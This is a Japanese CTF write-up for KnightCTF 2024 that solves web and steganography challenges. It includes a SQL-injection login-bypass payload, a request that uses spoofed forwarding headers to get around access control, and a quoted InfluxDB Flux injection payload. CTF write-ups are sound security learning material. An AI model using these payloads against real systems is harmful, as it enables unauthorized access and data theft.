# KnightCTF 2024

KnightCTF 2024（<https://ctftime.org/event/2209>）に参加しました。  
土, 20 1月 2024, 15:00 UTC — 日, 21 1月 2024, 15:00 UTC

2024年最初のCTFでした。  
Webは他にも3問くらいありましたが、いつの間にか追加されてたため、その問題はやってません。

<!-- @import "[TOC]" {cmd="toc" depthFrom=2 depthTo=3 orderedList=false} -->

<!-- code_chunk_output -->

- [Web](#web)
  - [Levi Ackerman](#levi-ackerman)
  - [Kitty](#kitty)
  - [README](#readme)
  - [Fluxx](#fluxx)
- [Steganography](#steganography)
  - [Oceanic](#oceanic)

<!-- /code_chunk_output -->

## Web

### Levi Ackerman

50 points / 590 solves

robots.txtを調べるだけでした。

```text
Disallow : /l3v1_4ck3rm4n.html
```

`/l3v1_4ck3rm4n.html`にアクセスすると、フラグがありました。

- Flag

```text
KCTF{1m_d01n6_17_b3c4u53_1_h4v3_70}
```

### Kitty

50 points / 436 solves

URLにアクセスすると、ログイン画面が表示されます。  
`"`を使うとSQLエラーが表示されたため、`or`を使ってログインバイパスできました。

```json
{"username": "\"or\"a\"=\"a", "password": "\"or\"a\"=\"a" }
```

ログイン後にダッシュボードのソースを見ると、以下のような記述があります。

```html
<script>
    function addPost(event) {
        event.preventDefault();
        const post_in = document.getElementById('post_input').value;
        
        if (post_in.startsWith('cat flag.txt')) {
            fetch('/execute', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/x-www-form-urlencoded'
                },
                body: `post_input=${encodeURIComponent(post_in)}`
            })
            .then(response => response.text())
            .then(result => {
                const contentSection = document.querySelector('.content');
                const newPost = document.createElement('div');
                newPost.classList.add('post');
                newPost.innerHTML = `<h3>Flag Post</h3><p>${result}</p>`;
                contentSection.appendChild(newPost);
            });
        } else {
            const contentSection = document.querySelector('.content');
            const newPost = document.createElement('div');
            newPost.classList.add('post');
            newPost.innerHTML = `<h3>User Post</h3><p>${post_in}</p>`;
            contentSection.appendChild(newPost);
        }
    }
</script>
```

`post_input`に`cat flag.txt`を入力すると、POSTリクエストが送られ、フラグを取得できました。

- Flag

```text
KCTF{Fram3S_n3vE9_L1e_4_toGEtH3R}
```

### README

305 points / 40 solves

与えられたURLにアクセスすると、text.txtとflag.txtへのリンクがあります。  
`/fetch?file=text.txt`にアクセスすると、text.txtの内容が表示されますが、`/fetch?file=flag.txt`にアクセスすると、401エラーが返ってきます。  
とりあえずアクセス制御がかかっているようなので、ヘッダをいろいろ試してみます。

```http
GET /fetch?file=flag.txt HTTP/1.1
Host: 66.228.53.87:8989
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.199 Safari/537.36
Accept: */*
Referer: http://66.228.53.87:8989/
Accept-Encoding: gzip, deflate, br
Accept-Language: ja,en-US;q=0.9,en;q=0.8
Connection: close
X-Originating-IP: 127.0.0.1
X-Forwarded-For: 127.0.0.1
X-Forwarded: 127.0.0.1
Forwarded-For: 127.0.0.1
X-Remote-IP: 127.0.0.1
X-Remote-Addr: 127.0.0.1
X-ProxyUser-Ip: 127.0.0.1
X-Original-URL: 127.0.0.1
Client-IP: 127.0.0.1
True-Client-IP: 127.0.0.1
Cluster-Client-IP: 127.0.0.1
X-ProxyUser-Ip: 127.0.0.1


```

フラグが取れました。

```http
HTTP/1.0 200 OK
Content-Type: application/json
Content-Length: 34
Server: Werkzeug/2.0.3 Python/3.6.15
Date: Sun, 21 Jan 2024 07:09:43 GMT

{"result":"KCTF{kud05w3lld0n3!}"}
```

どうやら以下のヘッダがあればよいようです。

```text
Forwarded-For: 127.0.0.1
```

- Flag

```text
KCTF{kud05w3lld0n3!}
```

### Fluxx

340 points / 33 solves

解けなかった問題で、ソースコード無し。  
問題文からTime-series Databaseに関係すると思われます。

他の人のWriteupを見ると、InfluxDBが使われておりNoSQL Injectionが可能なようでした。  
<https://rafa.hashnode.dev/influxdb-nosql-injection>

以下のような形でプライベートなバケットを取得できるようです。

```text
") |> yield(name: "1337") 
buckets() |> filter(fn: (r) => r.name =~ /^a.*/ and die(msg:r.name)) 
//
```

参考：
<https://github.com/Aryt3/writeups/tree/main/jeopardy_ctfs/2024/knight_ctf_2024/Fluxx>

## Steganography

### Oceanic

100 points / 125 solves

以下の2つのファイルが渡されます。

- clue.jpg
- peaceful.wav

peaceful.wavの中に隠されたファイルがあると思われるため、clue.jpgを見てみます。

```sh
$ exiftool clue.jpg 
ExifTool Version Number         : 11.88
File Name                       : clue.jpg
Directory                       : .
File Size                       : 20 kB
File Modification Date/Time     : 2024:01:04 20:25:01+09:00
File Access Date/Time           : 2024:01:21 20:28:56+09:00
File Inode Change Date/Time     : 2024:01:21 20:28:54+09:00
File Permissions                : rw-r--r--
File Type                       : JPEG
File Type Extension             : jpg
MIME Type                       : image/jpeg
JFIF Version                    : 1.01
Resolution Unit                 : inches
X Resolution                    : 300
Y Resolution                    : 300
Comment                         : 8qQd3iMYmtsyto7aXUuw1KVRpQFCRxqRtJiRgP85e36y
Image Width                     : 612
Image Height                    : 344
Encoding Process                : Progressive DCT, Huffman coding
Bits Per Sample                 : 8
Color Components                : 3
Y Cb Cr Sub Sampling            : YCbCr4:4:4 (1 1)
Image Size                      : 612x344
Megapixels                      : 0.211
```

Commentに気になる文字列が入っています。

```text
8qQd3iMYmtsyto7aXUuw1KVRpQFCRxqRtJiRgP85e36y
```

いろいろ試してみると、Base58でデコードすると意味のある文字列になりました。

```text
theoceanisactuallyreallydeeeepp
```

おそらく、peaceful.wavの中に隠されたファイルのパスワードだと思われますが、steghideでは解決しませんでした。  
問題文からDeepSoundというツールっぽかったので使ってみます。

<https://github.com/Jpinsoft/DeepSound>

`flag.png`を取得できました。あとはファイルを調べるだけです。

```sh
$ binwalk -e flag.png 

DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
0             0x0             JPEG image data, JFIF standard 1.01
4435          0x1153          Zip archive data, at least v1.0 to extract, name: flag/
4498          0x1192          Zip archive data, at least v1.0 to extract, compressed size: 35, uncompressed size: 35, name: flag/flag.txt
4762          0x129A          End of Zip archive, footer length: 22
```

```sh
$ tree _flag.png.extracted/
_flag.png.extracted/
├── 1153.zip
└── flag
    └── flag.txt

1 directory, 2 files
```

画像ファイルにzipファイルが埋め込まれていたため、解凍するとフラグがありました。  
テキスト形式だったので、stringsコマンドでも取得できたと思います。

```sh
$ cat _flag.png.extracted/flag/flag.txt 
KCTF{mul71_l4y3r3d_57360_ec4dacb5}
```

- Flag

```text
KCTF{mul71_l4y3r3d_57360_ec4dacb5}
```
